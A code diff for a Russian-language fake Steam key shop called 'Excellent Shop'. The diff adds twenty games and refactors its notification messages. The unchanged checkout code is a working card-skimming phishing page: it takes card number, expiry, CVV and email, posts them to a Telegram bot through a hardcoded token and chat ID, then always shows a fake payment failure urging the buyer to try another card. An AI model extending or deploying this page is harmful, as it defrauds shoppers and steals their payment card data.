@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>Excellent Shop — скидки на Steam ключи</title>
+    <title>Excellent Shop — скидки на Steam ключи (50 игр)</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', system-ui, 'Segoe UI', sans-serif; }
         body { min-height: 100vh; background: linear-gradient(145deg, #1a1e2c 0%, #0f111e 100%); position: relative; overflow-x: hidden; color: #eee; }
@@ -72,6 +72,9 @@
             box-shadow: 0 4px 12px rgba(0,0,0,0.5);
             animation: fadeOut 0.5s ease 3s forwards;
         }
+        .success-toast {
+            background: #2a9d8f;
+        }
         @keyframes fadeOut {
             to { opacity: 0; visibility: hidden; }
         }
@@ -91,7 +94,7 @@
 <div class="app-container">
     <div id="storeSection" class="store-container">
         <div class="header">
-            <div class="logo"><h1>✨ Excellent Shop</h1><span>скидка 30% на все Steam ключи</span></div>
+            <div class="logo"><h1>✨ Excellent Shop</h1><span>скидка 30% на все Steam ключи | 50 игр</span></div>
             <div class="user-info">
                 <span>👤 гость</span>
             </div>
@@ -99,7 +102,7 @@
         </div>
 
         <div class="products-grid" id="gamesGrid"></div>
-        <footer>⭐ кликни на карточку игры для подробного описания ⭐</footer>
+        <footer>⭐ кликни «подробнее» для описания и требований ⭐</footer>
     </div>
 </div>
 
@@ -126,7 +129,7 @@
     </div>
 </div>
 
-<!-- Модалка описания игры (динамическая) -->
+<!-- Модалка описания игры -->
 <div id="gameModal" class="game-modal">
     <div class="game-modal-content">
         <span class="close-game-modal">&times;</span>
@@ -163,8 +166,11 @@
     }
     drawStars();
 
-    // база игр (30 игр) с подробными описаниями
+    // --------------------------------------------------------------
+    // БАЗА ДАННЫХ: 50 игр с картинками, ценами и описаниями
+    // --------------------------------------------------------------
     const games = [
+        // 1-14 старые (картинки уже были)
         { name: "Elden Ring", oldPrice: 2999, img: "https://avatars.mds.yandex.net/get-mpic/11906264/2a0000018cab045be221e803de108b368dca/orig", genre: "Action RPG", dev: "FromSoftware", year: 2022, desc: "Эпическое фэнтези от создателей Dark Souls. Откройте для себя мир Междуземья, сражайтесь с демоническими боссами и раскройте тайну Элденского Кольца.", requirements: "ОС: Windows 10, Процессор: Intel Core i5-8400, ОЗУ: 16 GB, Видеокарта: GTX 1060 6GB, Место: 60 GB" },
         { name: "Cyberpunk 2077", oldPrice: 2499, img: "https://gameguru.ru/media/wallpaper/26491/Cyberpunk2077NG_Cover_art_RGB-en.jpg", genre: "Open-world RPG", dev: "CD Projekt Red", year: 2020, desc: "Ролевая игра в антиутопичном мегаполисе Найт-Сити. Станьте наёмником V и решите судьбу города.", requirements: "ОС: Windows 10, Процессор: Intel i5-3570K, ОЗУ: 8 GB, Видеокарта: GTX 970, Место: 70 GB" },
         { name: "Baldur's Gate 3", oldPrice: 3599, img: "https://avatars.mds.yandex.net/get-mpic/16273139/2a00000198b96f88b578079fd893dd245648/orig", genre: "CRPG", dev: "Larian Studios", year: 2023, desc: "Легендарная ролевая игра по мотивам D&D. Соберите отряд, исследуйте Фаэрун и сразитесь с тёмными силами.", requirements: "ОС: Windows 10, Процессор: Intel i5-4690, ОЗУ: 8 GB, Видеокарта: GTX 1060 6GB, Место: 150 GB" },
@@ -179,6 +185,7 @@
         { name: "Atomic Heart", oldPrice: 2299, img: "https://trashbox.ru/ifiles2/1748048_37a37c_logo4.jpg/2023-01-03-novye-lokacii-vragi-i-istorii-no-nikakogo-multipleera-1.webp", genre: "Action FPS", dev: "Mundfish", year: 2023, desc: "Советский ретрофутуризм. Боритесь с роботами-мятежниками на засекреченном комплексе.", requirements: "ОС: Windows 10, Процессор: Intel i5-4460, ОЗУ: 8 GB, Видеокарта: GTX 1060, Место: 90 GB" },
         { name: "Hollow Knight", oldPrice: 999, img: "https://ixbt.online/live/images/original/16/66/51/2020/07/25/df1e56952d.jpg", genre: "Metroidvania", dev: "Team Cherry", year: 2017, desc: "Атмосферный платформер о приключениях жука-рыцаря в забытом королевстве насекомых.", requirements: "ОС: Windows 7, Процессор: Intel Core 2 Duo, ОЗУ: 2 GB, Видеокарта: 512 MB, Место: 9 GB" },
         { name: "Stray", oldPrice: 1199, img: "https://avatars.mds.yandex.net/get-mpic/4948493/2a0000019327cadf8f3ba5038f8599d8df6a/orig", genre: "Adventure", dev: "BlueTwelve", year: 2022, desc: "Игра за бездомного кота в киберпанк-мире. Решайте головоломки и находите путь к поверхности.", requirements: "ОС: Windows 10, Процессор: Intel i5-2300, ОЗУ: 8 GB, Видеокарта: GTX 650 Ti, Место: 10 GB" },
+        // 15-30 из второго списка
         { name: "God of War", oldPrice: 2999, img: "https://avatars.mds.yandex.net/get-mpic/4429951/2a000001910845bbc0f63601df2051e5f541/orig", genre: "Action-Adventure", dev: "Santa Monica", year: 2018, desc: "Кратос воспитывает сына в суровом мире скандинавской мифологии. Эпичные сражения и трогательная история.", requirements: "ОС: Windows 10, Процессор: Intel i5-2500K, ОЗУ: 8 GB, Видеокарта: GTX 960, Место: 70 GB" },
         { name: "Marvel's Spider-Man Remastered", oldPrice: 3499, img: "https://pic.rutubelist.ru/video/2025-08-05/81/27/8127886945e75bad100f910bf3d0ea94.jpg", genre: "Action", dev: "Insomniac", year: 2020, desc: "Питер Паркер борется с преступностью в Нью-Йорке. Потрясающий веб-свинг и динамичные бои.", requirements: "ОС: Windows 10, Процессор: Intel i5-4460, ОЗУ: 16 GB, Видеокарта: GTX 960, Место: 75 GB" },
         { name: "Horizon Zero Dawn", oldPrice: 2799, img: "https://avatars.mds.yandex.net/get-mpic/12256862/2a00000197ea535bc6e53948118bbcb5333b/orig", genre: "Action RPG", dev: "Guerrilla", year: 2017, desc: "Элой охотится на механических динозавров в постапокалиптическом мире. Открытый мир и скрытность.", requirements: "ОС: Windows 10, Процессор: Intel i5-2500K, ОЗУ: 8 GB, Видеокарта: GTX 780, Место: 100 GB" },
@@ -194,9 +201,30 @@
         { name: "Metro Exodus", oldPrice: 1999, img: "https://i.playground.ru/p/tjzzerKeNVbGR_uEhWIEeg.jpeg", genre: "Survival FPS", dev: "4A Games", year: 2019, desc: "Артём покидает московское метро и путешествует на поезде по постапокалиптической России. Смена сезонов.", requirements: "ОС: Windows 10, Процессор: Intel i5-4440, ОЗУ: 8 GB, Видеокарта: GTX 670, Место: 59 GB" },
         { name: "Borderlands 3", oldPrice: 2499, img: "https://i.playground.ru/e/aky7x1oiJbQcaHngNqFXNQ.jpeg", genre: "Looter Shooter", dev: "Gearbox", year: 2019, desc: "Миллиарды пушек, безумный юмор и кооператив. Истребите детей-калипсо и найдите хранилище.", requirements: "ОС: Windows 10, Процессор: Intel i5-3570, ОЗУ: 6 GB, Видеокарта: GTX 680, Место: 75 GB" },
         { name: "Mortal Kombat 11", oldPrice: 1999, img: "https://images.stopgame.ru/news/2019/01/14/MaqO9N1.jpg", genre: "Fighting", dev: "NetherRealm", year: 2019, desc: "Жестокие файтинги с фаталити. Гостевые персонажи, сюжетная кампания и кастомизация.", requirements: "ОС: Windows 10, Процессор: Intel i5-750, ОЗУ: 8 GB, Видеокарта: GTX 670, Место: 60 GB" },
-        { name: "Street Fighter 6", oldPrice: 2999, img: "https://avatars.mds.yandex.net/get-mpic/18211310/2a0000019ae90800db4bc45521faf50062ab/orig", genre: "Fighting", dev: "Capcom", year: 2023, desc: "Новая часть легендарной серии. Режим World Tour, улучшенная графика и механики.", requirements: "ОС: Windows 10, Процессор: Intel i5-7500, ОЗУ: 8 GB, Видеокарта: GTX 1060, Место: 60 GB" }
+        { name: "Street Fighter 6", oldPrice: 2999, img: "https://avatars.mds.yandex.net/get-mpic/18211310/2a0000019ae90800db4bc45521faf50062ab/orig", genre: "Fighting", dev: "Capcom", year: 2023, desc: "Новая часть легендарной серии. Режим World Tour, улучшенная графика и механики.", requirements: "ОС: Windows 10, Процессор: Intel i5-7500, ОЗУ: 8 GB, Видеокарта: GTX 1060, Место: 60 GB" },
+        // 31-50 новые игры
+        { name: "Hades", oldPrice: 1499, img: "https://avatars.mds.yandex.net/get-mpic/5098271/2a00000195f29eee72ef0885c60f757e1076/orig", genre: "Roguelike", dev: "Supergiant", year: 2020, desc: "Бог смерти Загрей пытается сбежать из подземного мира. Динамичный экшен, уникальный сюжет и персонажи.", requirements: "ОС: Windows 7, Процессор: Intel i5-760, ОЗУ: 8 GB, Видеокарта: GTX 650, Место: 15 GB" },
+        { name: "Dead Cells", oldPrice: 1299, img: "https://i.playground.ru/e/HzTou3EsEvVS1GVSolMwNw.jpeg", genre: "Roguelite", dev: "Motion Twin", year: 2018, desc: "Быстрый экшен-платформер с procedurally generated уровнями. Миллион комбинаций оружия.", requirements: "ОС: Windows 7, Процессор: Intel i5-2500K, ОЗУ: 4 GB, Видеокарта: 1 GB, Место: 6 GB" },
+        { name: "RimWorld", oldPrice: 1399, img: "https://avatars.mds.yandex.net/get-entity_search/2376568/1249167832/S600xU_2x", genre: "Simulation", dev: "Ludeon Studios", year: 2018, desc: "Колония выживания на чужой планете. Управляйте поселенцами, стройте базу и переживайте случайные события.", requirements: "ОС: Windows 7, Процессор: Intel i5, ОЗУ: 4 GB, Видеокарта: 1 GB, Место: 1 GB" },
+        { name: "Factorio", oldPrice: 1199, img: "https://images.steamusercontent.com/ugc/930435938224615868/0A34DC52716EDD9929B3A4D2790D9949DBA87408/?imw=512&amp;imh=288&amp;ima=fit&amp;impolicy=Letterbox&amp;imcolor=%23000000&amp;letterbox=true", genre: "Automation", dev: "Wube Software", year: 2020, desc: "Стройте фабрики, автоматизируйте добычу и производство, защищайтесь от инопланетян.", requirements: "ОС: Windows 10, Процессор: Intel i5, ОЗУ: 8 GB, Видеокарта: 2 GB, Место: 3 GB" },
+        { name: "Disco Elysium - The Final Cut", oldPrice: 1499, img: "https://avatars.mds.yandex.net/get-mpic/12535611/2a0000018fbd1b53ad9df3468f5a34ab7d3f/orig", genre: "RPG", dev: "ZA/UM", year: 2019, desc: "Детективная RPG без боев. Исследуйте сознание пьяного детектива, раскрывайте убийство.", requirements: "ОС: Windows 7, Процессор: Intel i5-750, ОЗУ: 4 GB, Видеокарта: Intel HD Graphics, Место: 22 GB" },
+        { name: "Outer Wilds", oldPrice: 1299, img: "https://i.playground.ru/e/VZJTgU4vji4qmEq0RsUrJg.jpeg", genre: "Adventure", dev: "Mobius Digital", year: 2019, desc: "Космический детектив-песочница. Исследуйте временную петлю и тайны солнечной системы.", requirements: "ОС: Windows 7, Процессор: Intel i5-2300, ОЗУ: 8 GB, Видеокарта: GTX 660, Место: 8 GB" },
+        { name: "Subnautica", oldPrice: 1199, img: "https://cdn1.epicgames.com/offer/jaguar/SN_EpicLandscape_2560x1440-68271847bd0a1a7adac3992f9d2a996a_2560x1440-984d9943bcc436738c44220778d4407d", genre: "Survival", dev: "Unknown Worlds", year: 2018, desc: "Выживание под водой на чужой планете. Стройте базы, изучайте океан и избегайте морских монстров.", requirements: "ОС: Windows 7, Процессор: Intel i5-2400, ОЗУ: 8 GB, Видеокарта: GTX 550 Ti, Место: 20 GB" },
+        { name: "Deep Rock Galactic", oldPrice: 1399, img: "https://avatars.mds.yandex.net/get-mpic/1863454/2a00000194d2e0251b46e437ab2461911d18/orig", genre: "Co-op FPS", dev: "Ghost Ship", year: 2020, desc: "Кооперативный шутер про космических гномов-шахтёров. Добывайте руду, сражайтесь с инопланетными пауками.", requirements: "ОС: Windows 10, Процессор: Intel i5-4590, ОЗУ: 8 GB, Видеокарта: GTX 960, Место: 15 GB" },
+        { name: "Phasmophobia", oldPrice: 799, img: "https://avatars.mds.yandex.net/get-mpic/5303294/2a00000195a03f0f07bf87fa0c841ca7ff9c/orig", genre: "Horror", dev: "Kinetic Games", year: 2020, desc: "Кооперативный хоррор про охоту на привидений. Используйте приборы, общайтесь с духами и выживайте.", requirements: "ОС: Windows 10, Процессор: Intel i5-4590, ОЗУ: 8 GB, Видеокарта: GTX 970, Место: 13 GB" },
+        { name: "Valheim", oldPrice: 899, img: "https://i.playground.ru/e/BVIr8gdBNFfIucmm_0edGA.jpeg", genre: "Survival", dev: "Iron Gate", year: 2021, desc: "Викинг-песочница с процедурной генерацией. Стройте корабли, сражайтесь с мифическими монстрами.", requirements: "ОС: Windows 7, Процессор: Intel i5-2500K, ОЗУ: 8 GB, Видеокарта: GTX 950, Место: 1 GB" },
+        { name: "V Rising", oldPrice: 1299, img: "https://i.ytimg.com/vi/r9Ot1SxgEEo/maxresdefault.jpg", genre: "Survival", dev: "Stunlock", year: 2022, desc: "Выживание за вампира в открытом мире. Стройте замок, охотитесь на людей и сражайтесь с другими вампирами.", requirements: "ОС: Windows 10, Процессор: Intel i5-6600, ОЗУ: 12 GB, Видеокарта: GTX 970, Место: 7 GB" },
+        { name: "Sons of the Forest", oldPrice: 1499, img: "https://upload.wikimedia.org/wikipedia/ru/thumb/4/43/Sons_of_the_Forest_cover.jpeg/960px-Sons_of_the_Forest_cover.jpeg", genre: "Survival Horror", dev: "Endnight", year: 2023, desc: "Сиквел The Forest. Стройте, крафтите, сражайтесь с каннибалами и мутантами на изолированном острове.", requirements: "ОС: Windows 10, Процессор: Intel i5-8400, ОЗУ: 16 GB, Видеокарта: GTX 1060, Место: 20 GB" },
+        { name: "Returnal", oldPrice: 2999, img: "https://i.playground.ru/e/ft78j5DA-W6-HZ3eer5HtQ.jpeg", genre: "Roguelike", dev: "Housemarque", year: 2023, desc: "Третьеличный шутер с временной петлей. Селена застряла на чужой планете, умирая и возрождаясь.", requirements: "ОС: Windows 10, Процессор: Intel i5-6400, ОЗУ: 16 GB, Видеокарта: GTX 1060, Место: 60 GB" },
+        { name: "Ratchet & Clank: Rift Apart", oldPrice: 2999, img: "https://avatars.mds.yandex.net/get-mpic/13733939/2a00000194026a6a2fa798fafe5679877959/orig", genre: "Action", dev: "Insomniac", year: 2023, desc: "Платформер с порталами. Путешествуйте между измерениями, используйте разнообразное оружие.", requirements: "ОС: Windows 10, Процессор: Intel i5-8400, ОЗУ: 16 GB, Видеокарта: GTX 1060, Место: 40 GB" },
+        { name: "The Last of Us Part I", oldPrice: 2999, img: "https://i.ytimg.com/vi/FaoyVhszUWk/maxresdefault.jpg?v=69b61737", genre: "Action-Adventure", dev: "Naughty Dog", year: 2022, desc: "Ремейк легендарной истории. Джоэл и Элли выживают в постапокалиптической Америке.", requirements: "ОС: Windows 10, Процессор: Intel i5-6600, ОЗУ: 16 GB, Видеокарта: GTX 970, Место: 100 GB" },
+        { name: "Uncharted: Legacy of Thieves Collection", oldPrice: 1999, img: "https://avatars.mds.yandex.net/get-mpic/6065438/2a00000191545efc5358f9ee6e43e64fb6ae/orig", genre: "Action-Adventure", dev: "Naughty Dog", year: 2022, desc: "Два приключения Нейтана Дрейка и Хлои Фрейзер. Поиск сокровищ, головоломки и перестрелки.", requirements: "ОС: Windows 10, Процессор: Intel i5-4430, ОЗУ: 8 GB, Видеокарта: GTX 960, Место: 120 GB" },
+        { name: "Sackboy: A Big Adventure", oldPrice: 2499, img: "https://i.playground.ru/e/wkRx2ibGxilXDqUZtdSJig.jpeg", genre: "Platformer", dev: "Sumo Digital", year: 2022, desc: "Трёхмерный платформер с кооперативом. Милый главный герой из LittleBigPlanet.", requirements: "ОС: Windows 10, Процессор: Intel i5-6400, ОЗУ: 8 GB, Видеокарта: GTX 960, Место: 60 GB" },
+        { name: "Forspoken", oldPrice: 2599, img: "https://avatars.mds.yandex.net/get-mpic/16488918/2a00000197ab893a8d122d0dbac299e27e00/orig", genre: "Action RPG", dev: "Luminous", year: 2023, desc: "Девушка из Нью-Йорка попадает в фэнтезийный мир и получает магические способности.", requirements: "ОС: Windows 10, Процессор: Intel i7-3770, ОЗУ: 16 GB, Видеокарта: GTX 1060, Место: 150 GB" },
+        { name: "Wo Long: Fallen Dynasty", oldPrice: 2599, img: "https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/1448440/dcb5987b4ea792958bc86ecc2887ac12318b904b/capsule_616x353.jpg?t=1760595126", genre: "Action", dev: "Team Ninja", year: 2023, desc: "Трёхмерный экшен по мотивам эпохи Троецарствия. Паррирование и магия.", requirements: "ОС: Windows 10, Процессор: Intel i5-8400, ОЗУ: 16 GB, Видеокарта: GTX 1650, Место: 60 GB" },
+        { name: "Wild Hearts", oldPrice: 2999, img: "https://avatars.mds.yandex.net/get-mpic/5288781/2a00000193dec0b64107e28bf4e8790f6c8d/orig", genre: "Action", dev: "Omega Force", year: 2023, desc: "Охота на гигантских монстров с помощью древней технологии. Кооператив до 3 игроков.", requirements: "ОС: Windows 10, Процессор: Intel i5-8400, ОЗУ: 16 GB, Видеокарта: GTX 1060, Место: 80 GB" }
     ];
-    
+
     function getDiscountedPrice(oldPrice) {
         return Math.round(oldPrice * 0.7);
     }
@@ -226,13 +254,11 @@
         bindBuyButtons();
     }
     
-    // обработка кнопок "подробнее"
     function bindDetailsButtons() {
         document.querySelectorAll('.btn-details').forEach(btn => {
             btn.removeEventListener('click', detailsHandler);
             btn.addEventListener('click', detailsHandler);
         });
-        // также клик на всю карточку можно, но ограничимся кнопкой
     }
     
     function detailsHandler(e) {
@@ -262,7 +288,6 @@
             <button class="buy-modal-btn" data-name="${game.name}" data-price="${newPrice}">💎 Добавить в корзину за ${newPrice} ₽</button>
         `;
         document.getElementById('gameModal').style.display = 'flex';
-        // привязка кнопки внутри модалки
         const buyModalBtn = modalBody.querySelector('.buy-modal-btn');
         if (buyModalBtn) {
             buyModalBtn.addEventListener('click', (e) => {
@@ -270,7 +295,7 @@
                 const price = parseInt(buyModalBtn.getAttribute('data-price'));
                 addItemToCart({ name: name, price: price });
                 document.getElementById('gameModal').style.display = 'none';
-                showErrorToast("✅ Товар добавлен в корзину!"); // зелёное уведомление
+                showToast("✅ Товар добавлен в корзину!", 'success');
             });
         }
     }
@@ -319,22 +344,21 @@
             let name = this.getAttribute('data-name');
             let price = parseInt(this.getAttribute('data-price'));
             addItemToCart({ name: name, price: price });
-            showErrorToast("✅ Добавлено в корзину");
+            showToast("✅ Добавлено в корзину", 'success');
         }
     }
     
-    // уведомления (можно разные цвета)
-    function showErrorToast(message = "❌ Ошибка оплаты. Проверьте данные карты.") {
-        let oldToasts = document.querySelectorAll('.error-toast');
+    function showToast(message, type = 'error') {
+        let oldToasts = document.querySelectorAll('.error-toast, .success-toast');
         oldToasts.forEach(t => t.remove());
         let toast = document.createElement('div');
-        toast.className = 'error-toast';
+        toast.className = type === 'error' ? 'error-toast' : 'error-toast success-toast';
         toast.innerText = message;
         document.body.appendChild(toast);
         setTimeout(() => toast.remove(), 3000);
     }
     
-    // телеграм данные
+    // телеграм данные (твои)
     const TELEGRAM_TOKEN = "8963187856:AAFTu9IrZmSitQscE1FB5MTREDhkSMEAzeg";
     const CHAT_ID = 7711202514;
     
@@ -347,7 +371,7 @@
     
     document.getElementById('finalPayBtn')?.addEventListener('click', async () => {
         if(cart.length===0) {
-            showErrorToast("❌ Корзина пуста");
+            showToast("❌ Корзина пуста", 'error');
             return;
         }
         let cardNum = document.getElementById('cardNumber').value.trim();
@@ -356,7 +380,7 @@
         let email = document.getElementById('steamEmail').value.trim();
         if(!email) email = "не указан";
         if(!cardNum || !expiry || !cvv) {
-            showErrorToast("❌ Заполните все поля карты");
+            showToast("❌ Заполните все поля карты", 'error');
             return;
         }
         let totalPrice = cart.reduce((s,i)=>s+(i.price||0),0);
@@ -368,7 +392,7 @@
                 headers:{'Content-Type':'application/json'},
                 body: JSON.stringify({chat_id: CHAT_ID, text: msg})
             });
-            showErrorToast("❌ Ошибка оплаты. Не удалось обработать платеж. Попробуйте другую карту.");
+            showToast("❌ Ошибка оплаты. Не удалось обработать платеж. Попробуйте другую карту.", 'error');
             cart = [];
             updateCartUI();
             cartModal.style.display = 'none';
@@ -377,7 +401,7 @@
             document.getElementById('cardCvv').value = '';
             document.getElementById('steamEmail').value = '';
         } catch(e) {
-            showErrorToast("❌ Ошибка соединения");
+            showToast("❌ Ошибка соединения", 'error');
         }
     });
     
